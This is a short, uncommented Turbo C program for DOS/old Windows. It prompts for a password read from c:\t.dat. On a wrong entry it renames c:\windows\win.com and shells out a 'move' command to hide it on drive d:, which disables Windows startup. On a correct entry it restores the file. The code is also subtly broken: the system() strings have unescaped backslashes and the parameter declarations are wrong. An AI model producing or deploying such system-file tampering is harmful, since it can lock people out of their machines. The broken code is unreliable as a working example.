#include<string.h>
#include<process.h>
#include<stdlib.h>
#include<dos.h>
#include<graphics.h>
#include<conio.h>
#include<stdio.h>
#include<fstream.h>
main(int argc,char *s)
{
s="user.exe,exitwindows";
char *pass, y[5];
clrscr();
int gdriver = DETECT,gmode,errorcode;
initgraph(&gdriver, &gmode, "e:\\tc\\bgi");
settextstyle(2,HORIZ_DIR,25);
setcolor(4);
setactivepage(1);
outtextxy(getmaxx()/2-40,getmaxy()/2-40,"TERMINATED");
setactivepage(0);
outtextxy(getmaxx()/2-40,getmaxy()/2-40,"HI");
setvisualpage(0);
pass = getpass ("Enter Password :");
FILE *fp;
fp=fopen("c:\\t.dat","r");
fgets(y,5,fp);
int l = strcmp(y,pass);
if(l!=0)
{
setvisualpage(1);
delay(20);
rename("c:\\windows\\win.com","c:\\windows\\srn.som");
system("move c:\windows\srn.som d:\ ");
}
else
{
system("move d:\srn.som c:\windows\ ");
rename("c:\\windows\\srn.som","c:\\windows\\win.com");

}
closegraph();
textcolor(BLACK);
}